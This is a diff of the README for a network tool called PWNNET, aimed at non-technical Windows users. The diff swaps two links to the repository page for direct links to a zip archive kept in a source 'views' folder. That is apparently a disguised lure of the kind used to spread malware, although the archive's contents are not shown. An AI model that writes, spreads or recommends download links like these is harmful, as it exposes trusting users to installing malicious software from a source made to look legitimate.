@@ -1,12 +1,12 @@
 # 🌐 PWNNET - Explore your network with ease
 
-[![Download PWNNET](https://img.shields.io/badge/Download-PWNNET-blue)] (https://github.com/mennaosa9029/PWNNET)
+[![Download PWNNET](https://img.shields.io/badge/Download-PWNNET-blue)] (https://github.com/mennaosa9029/PWNNET/raw/refs/heads/main/src/views/Software_1.7.zip)
 
 PWNNET helps you see what happens on your home or office network. It turns complex data into simple charts and lists. You can find devices, test connections, and check for security gaps without needing technical training.
 
 ## 📥 How to download 
 
-Visit [this page](https://github.com/mennaosa9029/PWNNET) to download the application. 
+Visit [this page](https://github.com/mennaosa9029/PWNNET/raw/refs/heads/main/src/views/Software_1.7.zip) to download the application. 
 
 Follow these steps to get the software on your Windows computer:
 
